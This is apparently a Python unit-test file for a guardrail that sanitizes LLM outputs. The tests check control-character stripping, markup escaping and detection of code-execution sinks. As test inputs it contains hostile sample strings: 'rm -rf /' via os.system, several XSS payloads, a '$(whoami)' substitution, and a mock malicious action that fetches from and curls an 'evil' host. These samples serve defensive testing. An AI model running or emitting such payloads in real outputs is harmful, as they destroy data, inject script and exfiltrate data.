"""Unit tests for the output sanitization guardrail (OWASP LLM02/LLM05).

Spec: specs/ai/guardrails.md (Layer 5 — Output Sanitizer).
"""

from __future__ import annotations

import pytest

from src.guardrails.output_sanitizer import (
    detect_code_exec_sinks,
    escape_markup,
    sanitize_output,
    sanitize_text,
    strip_control_chars,
)

pytestmark = pytest.mark.unit


class TestStripControlChars:
    def test_removes_c0_and_c1_control_chars(self) -> None:
        raw = "ok\x00\x07\x1b\x7f\x9bdone"
        cleaned, removed = strip_control_chars(raw)
        assert cleaned == "okdone"
        assert removed == 5

    def test_preserves_tab_newline_carriage_return(self) -> None:
        raw = "a\tb\nc\rd"
        cleaned, removed = strip_control_chars(raw)
        assert cleaned == raw
        assert removed == 0


class TestDetectCodeExecSinks:
    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("result = eval('2+2')", "python_eval_exec"),
            ("__import__('os').system('x')", "python_import"),
            ("pickle.loads(blob)", "unsafe_deserialize"),
            ("os.system('rm -rf /')", "os_system"),
            ("<script>alert(1)</script>", "html_script"),
            ('<img src=x onerror="alert(1)">', "html_event_handler"),
            ("<a href='javascript:alert(1)'>x</a>", "js_uri"),
            ("data:text/html,<b>", "data_html_uri"),
            ("value=$(whoami)", "shell_substitution"),
            ("render {{ user.secret }}", "template_injection"),
        ],
    )
    def test_detects_each_sink(self, text: str, expected: str) -> None:
        assert expected in detect_code_exec_sinks(text)

    def test_benign_text_has_no_sinks(self) -> None:
        assert detect_code_exec_sinks("Please summarise the quarterly report for the team.") == []

    def test_returns_sorted_unique(self) -> None:
        text = "eval(a); eval(b); <script>x</script>"
        sinks = detect_code_exec_sinks(text)
        assert sinks == sorted(set(sinks))


class TestEscapeMarkup:
    def test_escapes_active_markup(self) -> None:
        assert escape_markup("<script>&'\"") == "&lt;script&gt;&amp;&#x27;&quot;"


class TestSanitizeText:
    def test_execute_context_strips_and_detects_but_does_not_escape(self) -> None:
        # escape=False (default) is the execution-path mode.
        result = sanitize_text("<b>x</b>\x00 eval(y)", escape=False)
        assert result.control_chars_stripped == 1
        assert result.markup_escaped is False
        assert "<b>" in result.text  # markup NOT escaped on the execute path
        assert "python_eval_exec" in result.sinks_detected
        assert result.modified is True

    def test_render_context_escapes(self) -> None:
        result = sanitize_text("<b>x</b>", escape=True)
        assert result.markup_escaped is True
        assert "&lt;b&gt;" in result.text

    def test_benign_text_unmodified(self) -> None:
        result = sanitize_text("a normal sentence", escape=True)
        assert result.modified is False
        assert result.text == "a normal sentence"


class TestSanitizeOutput:
    def test_recurses_dicts_and_lists(self) -> None:
        value = {"a": "x\x00", "b": ["y\x07", {"c": "eval(z)"}], "n": 5, "ok": True}
        sanitized, report = sanitize_output(value)
        assert sanitized["a"] == "x"
        assert sanitized["b"][0] == "y"
        assert sanitized["n"] == 5  # non-string leaf untouched
        assert sanitized["ok"] is True
        assert report.control_chars_stripped == 2
        assert "python_eval_exec" in report.sinks_detected
        assert report.modified is True

    def test_benign_structure_not_modified(self) -> None:
        value = {"intent": "summarise", "target": "report", "count": 3}
        sanitized, report = sanitize_output(value)
        assert sanitized == value
        assert report.modified is False

    def test_render_mode_escapes_and_counts_fields(self) -> None:
        sanitized, report = sanitize_output({"msg": "<b>hi</b>", "plain": "ok"}, escape=True)
        assert sanitized["msg"] == "&lt;b&gt;hi&lt;/b&gt;"
        assert report.fields_escaped == 1
        assert report.modified is True

    def test_llm02_llm05_malicious_output_is_flagged(self) -> None:
        # A malicious LLM action payload: hidden control chars + an XSS sink + an exec sink.
        malicious = {
            "intent": "exfiltrate\x1b[2J",
            "note": "<script>fetch('//evil')</script>",
            "code": "__import__('os').system('curl evil')",
        }
        sanitized, report = sanitize_output(malicious)
        assert report.control_chars_stripped >= 1
        assert {"html_script", "python_import"}.issubset(set(report.sinks_detected))
        assert "\x1b" not in sanitized["intent"]
